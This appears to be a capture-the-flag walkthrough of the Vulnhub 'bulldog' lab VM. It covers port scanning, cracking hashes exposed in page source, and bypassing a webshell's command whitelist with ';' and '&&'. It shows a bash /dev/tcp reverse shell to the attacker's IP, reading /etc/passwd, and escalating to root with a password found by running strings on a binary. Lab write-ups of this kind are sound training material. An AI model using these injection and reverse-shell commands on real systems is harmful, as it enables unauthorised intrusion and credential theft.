---
title: Vulnhub-bulldog
---

# Vulnhub-bulldog

## Target VM Information

### Download Link

[https://download.vulnhub.com/bulldog/bulldog.ova](https://download.vulnhub.com/bulldog/bulldog.ova)

### VM Description

Bulldog Industries' recent website was defaced by malicious German Shepherd hackers. Does this mean there are more vulnerabilities to exploit? Why can't you find them?

This is a standard boot-to-root challenge. The goal is to enter the root directory and see the congratulatory message.

### Goal

Obtain root privileges and the flag.

### Runtime Environment

Target VM: NAT mode. The target VM obtains an IP automatically.
Attacker machine: windows10, kali linux2021.1

## Information Gathering

### Target Discovery

```shell
arp-scan -l
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-1.png)


### Port and Service Identification

Use `nmap` to scan all ports from `1` to `65535`, perform service fingerprinting, and save the scan results to a `.txt` file:

```shell
nmap -p1-65535 -A 192.168.160.189 -oN bulldog.txt
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-3.png)

Target host ports and services found:

```shell
# Port protocol backend service
TCP 23 SSH open-ssl 7.2p2
TCP 80 HTTP WSGIServer Python 2.7.12
TCP 8080 HTTP WSGIServer Python 2.7.12
# Operating system
Linux 3.2-4.9
```

## Vulnerability Discovery

Visit the website homepage directly. There is a link; click it to enter the notice page, but no valuable information is found.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-2.png)

Directory scan: `dirb http://192.168.160.189`

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-4.png)

Multiple directories are found. Visit them one by one.

`htttp://192.168.160.189/admin` is a Django admin backend requiring username/password login. Common weak passwords did not work, so skip brute forcing for now and check other pages first.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-5.png)

`htttp://192.168.160.189/dev` contains a lot of information. The key points are: the new system no longer uses PHP or any CMS and is instead developed with the Django framework. This means web injection vulnerabilities are less likely, and we should focus on Django framework vulnerabilities. Since the website does not use PHP, there is no need to look for PHP vulnerabilities or write a PHP webshell. The new system uses a webshell for management.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-6.png)

`http://192.168.160.189/dev/shell/` says authentication is required.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-7.png)

View the source of the pages above. On `htttp://192.168.160.189/dev`, each Team Lead's email and hash are visible, along with the obvious English hint: `We'll remove these in prod. It's not like a hacker can do anything with a hash`.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-8.png)

Take each hash to [https://hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash) and try to crack it. Eventually, two hashes are decrypted:

Back End: nick@bulldogindustries.com

Username: `nick`, password: `bulldog`

Database: sarah@bulldogindustries.com

Username: `sarah`, password: `bulldoglover`

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-9.png)

Use the decrypted passwords to log in to the backend.

Attempts to log in to the scanned SSH service on port `23` all failed. Using `sarah` with password `bulldoglover` successfully logs in to the admin backend, but there are no edit permissions.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-10.png)

Visit the webshell page again. Authentication has passed, commands can be executed, and this is a command execution interface.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-11.png)

The webshell page only allows whitelisted commands. Try using `;` or `&&` to chain multiple commands, and the bypass succeeds. Now execute a reverse shell command directly.

Start an `nc` listener: `nc -lvnp 4444`
Directly executing `ls && bash -i >& /dev/tcp/172.20.10.5/4444 0>&1` fails, and the server returns a `500` error.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-12.png)

Try using `echo` to output the command first and pipe it into `bash`: `echo "bash -i >& /dev/tcp/172.20.10.5/4444 0>&1" | bash`.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-13.png)

The reverse shell succeeds. We can also view `/etc/passwd` and find users with IDs greater than `1000`: `bulldogadmin` and `django`.

## Privilege Escalation

Search for each user's files, suppressing errors: `find / -user bulldogadmin 2>/dev/null`

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-14.png)

Two files are worth attention: `note` and `customPermissionApp`.

```shell
/home/bulldogadmin/.hiddenadmindirectory/note
/home/bulldogadmin/.hiddenadmindirectory/customPermissionApp
```

Open the `note` text file. It hints that the webserver sometimes needs root permissions. The note says executing this file can obtain root privileges, but `ls` shows the file only has read permission, so it cannot be executed.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-15.png)

Open `customPermissionApp`. It looks like an executable file. Use `strings` to print its printable strings: `strings /home/bulldogadmin/.hiddenadmindirectory/customPermissionApp`. Only these strings are visible. They may be related to a password. The English words include `SUPER`, `ulitimate`, `PASSWORD`, and `youCANTget`, all related to a privileged account. Remove the `H` characters to form a readable English sentence: `SUPERultimatePASSWORDyouCANTget`. The `su` command cannot be executed and reports: `must be run from a terminal`. Run the following statement:

```shell
python -c 'import pty;pty.spawn("/bin/bash")'
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-16.png)

Run `sudo su -`, obtain root privileges, and get the flag.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/bulldog1-17.png)

```bash
# Congratulations on completing this VM :D That wasn't so bad, was it?
# Let me know what you thought on Twitter, I'm @frichette_n
# As far as I know, there are two ways to get root. Can you find the other one?
# Perhaps the sequel will be more challenging. Until next time, I hope you enjoyed it
Conngratulations on completing this VM :D That wasn't so bad was it?
Let me know what you thought on twitter, I'm @frichette_n
As far as I know there are two ways to get root. Can you find the other one?
Perhaps the sequel will be more challenging. Until next time, I hope you enjoyed
```
